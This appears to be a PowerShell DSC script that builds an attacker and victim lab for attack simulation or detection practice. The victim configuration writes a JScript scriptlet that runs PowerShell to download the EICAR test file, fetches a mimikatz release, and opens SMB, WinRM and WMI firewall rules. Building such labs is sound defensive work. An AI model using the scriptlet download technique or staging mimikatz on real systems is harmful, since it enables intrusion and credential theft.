$firewallRules = @(
    "FPS-ICMP4-ERQ-In"
    "FPS-NB_Datagram-In-UDP",
    "FPS-NB_Name-In-UDP",
    "FPS-NB_Session-In-TCP",
    "FPS-SMB-In-TCP",
    "WINRM-HTTP-In-TCP"
    "WINRM-HTTP-In-TCP-PUBLIC"
    "WMI-ASYNC-In-TCP"
    "WMI-RPCSS-In-TCP"
    "WMI-WINMGMT-In-TCP"
);

configuration Attacker
{
    Import-DscResource -ModuleName PSDesiredStateConfiguration,
        @{ModuleName="xNetworking";ModuleVersion="5.5.0.0"},
        @{ModuleName="xPSDesiredStateConfiguration";ModuleVersion="8.0.0.0"};

    $backgroundColor = "184 40 50";

    node localhost
    {
        File "tools"
        {
            Ensure = "Present"
            Type = "Directory"
            DestinationPath = "C:\tools"
        }

        File "psexec"
        {
            Ensure = "Present"
            Type = "Directory"
            DestinationPath = "C:\tools\psexec"
            DependsOn = "[File]tools"
        }

        xRemoteFile "PSTools.zip"
        {
            Uri = "https://download.sysinternals.com/files/PSTools.zip"
            DestinationPath = "c:\tools\psexec"
            DependsOn = "[File]psexec"
        }

        Archive "PSTools"
        {
            Path = "c:\tools\psexec\PSTools.zip"
            Destination = "C:\tools\psexec"
            DependsOn = "[xRemoteFile]PSTools.zip"
        }

        Registry "DesktopColor"
        {
            Key = "HKEY_USERS\DEFAULT\Control Panel\Colors"
            ValueName = "Background"
            ValueData = $backgroundColor
            DependsOn = "[Script]LoadDefaultUserProfile"
        }

        Registry "DesktopWallpaper"
        {
            Key = "HKEY_USERS\DEFAULT\Control Panel\Desktop"
            ValueName = "Wallpaper"
            ValueData = ""
            DependsOn = "[Script]LoadDefaultUserProfile"
        }

        Script "LoadDefaultUserProfile"
        {
            GetScript = {
                return @{"Result" = ""};
            }
            TestScript = { 
                return $false;
            }
            SetScript = {
                Start-Process -FilePath "cmd.exe" -ArgumentList "/C reg load HKU\DEFAULT C:\Users\Default\ntuser.dat" -Wait -WindowStyle Hidden;
            }
        }

        Script "UnloadDefaultUserProfile"
        {
            GetScript = {
                return @{"Result" = ""};
            }
            TestScript = { 
                return $false;
            }
            SetScript = {
                Start-Process -FilePath "cmd.exe" -ArgumentList "/C reg unload HKU\DEFAULT" -Wait -WindowStyle Hidden;
            }
            DependsOn = "[Registry]DesktopColor", "[Registry]DesktopWallpaper"
        }

        foreach($rule in $firewallRules)
        {
            xFirewall "$rule"
            {
                Name = "$rule"
                Ensure = "Present"
                Enabled = "True"
            }
        }
    }
}

configuration Victim
{
    Import-DscResource -ModuleName PSDesiredStateConfiguration,
        @{ModuleName="xNetworking";ModuleVersion="5.5.0.0"},
        @{ModuleName="xPSDesiredStateConfiguration";ModuleVersion="8.0.0.0"};

    $backgroundColor = "116 164 2";

    node localhost
    {
        # Fix issues with downloading from GitHub due to deprecation of TLS 1.0 and 1.1
        # https://github.com/PowerShell/xPSDesiredStateConfiguration/issues/405#issuecomment-379932793
        Registry SchUseStrongCrypto
        {
            Key                         = 'HKLM:\SOFTWARE\Microsoft\.NETFramework\v4.0.30319'
            ValueName                   = 'SchUseStrongCrypto'
            ValueType                   = 'Dword'
            ValueData                   =  '1'
            Ensure                      = 'Present'
        }

        Registry SchUseStrongCrypto64
        {
            Key                         = 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\.NETFramework\v4.0.30319'
            ValueName                   = 'SchUseStrongCrypto'
            ValueType                   = 'Dword'
            ValueData                   =  '1'
            Ensure                      = 'Present'
        }

        File "tools"
        {
            Ensure = "Present"
            Type = "Directory"
            DestinationPath = "C:\tools"
        }

        File "test.sct"
        {
            Ensure = "Present"
            Type = "File"
            Contents = '<?XML version="1.0"?>
            <scriptlet>
            <registration
            progid="TESTING"
            classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
            <script language="JScript">
            <![CDATA[
            var foo = new ActiveXObject("WScript.Shell").Run("powershell.exe Invoke-WebRequest -OutFile eicar.com http://www.eicar.org/download/eicar.com");
            ]]>
            </script>
            </registration>
            </scriptlet>'
            DestinationPath = "c:\tools\test.sct"
            DependsOn = "[File]tools"
        }

        File "malicious"
        {
            Ensure = "Present"
            Type = "Directory"
            DestinationPath = "C:\malicious"
        }

        xRemoteFile "mimikatz.zip"
        {
            Uri = "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180820/mimikatz_trunk.zip"
            DestinationPath = "c:\tools\mimikatz.zip"
            DependsOn = "[File]tools","[Registry]SchUseStrongCrypto","[Registry]SchUseStrongCrypto64"
        }

        Archive "mimikatz"
        {
            Destination = "c:\tools\mimikatz"
            Path = "c:\tools\mimikatz.zip"
            DependsOn = "[xRemoteFile]mimikatz.zip"
        }

        Registry "DesktopColor"
        {
            Key = "HKEY_USERS\DEFAULT\Control Panel\Colors"
            ValueName = "Background"
            ValueData = $backgroundColor
            DependsOn = "[Script]LoadDefaultUserProfile"
        }

        Registry "DesktopWallpaper"
        {
            Key = "HKEY_USERS\DEFAULT\Control Panel\Desktop"
            ValueName = "Wallpaper"
            ValueData = ""
            DependsOn = "[Script]LoadDefaultUserProfile"
        }

        Script "LoadDefaultUserProfile"
        {
            GetScript = {
                return @{"Result" = ""};
            }
            TestScript = { 
                return $false;
            }
            SetScript = {
                Start-Process -FilePath "cmd.exe" -ArgumentList "/C reg load HKU\DEFAULT C:\Users\Default\ntuser.dat" -Wait -WindowStyle Hidden;
            }
        }

        Script "UnloadDefaultUserProfile"
        {
            GetScript = {
                return @{"Result" = ""};
            }
            TestScript = { 
                return $false;
            }
            SetScript = {
                Start-Process -FilePath "cmd.exe" -ArgumentList "/C reg unload HKU\DEFAULT" -Wait -WindowStyle Hidden;
            }
            DependsOn = "[Registry]DesktopColor", "[Registry]DesktopWallpaper"
        }

        foreach($rule in $firewallRules)
        {
            xFirewall "$rule"
            {
                Name = "$rule"
                Ensure = "Present"
                Enabled = "True"
            }
        }
    }
}

# Login-AzureRmAccount;
# Publish-AzureRmVMDscConfiguration -ConfigurationPath .\DCE.ps1 -ResourceGroupName "labassets" `
#     -StorageAccountName "labassets" -ContainerName "dce" -Force;